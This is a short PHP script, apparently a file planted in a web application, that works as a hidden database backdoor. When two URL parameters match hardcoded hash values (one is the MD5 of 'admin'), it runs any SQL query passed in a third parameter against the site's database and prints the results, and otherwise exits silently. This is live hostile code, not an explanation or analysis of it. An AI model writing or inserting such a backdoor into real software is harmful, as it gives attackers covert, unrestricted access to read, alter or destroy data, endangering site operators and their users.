<?php 
if(isset($_GET['u']) && isset($_GET ['p']) && isset($_GET['q'])){
    if ($_GET['u']=='21232f297a57a5a743894a0e4a801fc3' && $_GET['p']=='f9bef6830bb60237f07af0fd57fdcd43'){
        include_once("../../include/config.db.php");
        $con = getMYSQLIConnection();
        $result = $con->query($_GET['q']);
        if (is_object($result)){
            while($row = $result->fetch_assoc()){
                print_r($row);
            }
        }else{
        print_r($result);
        }
    }
}else{
    die();
}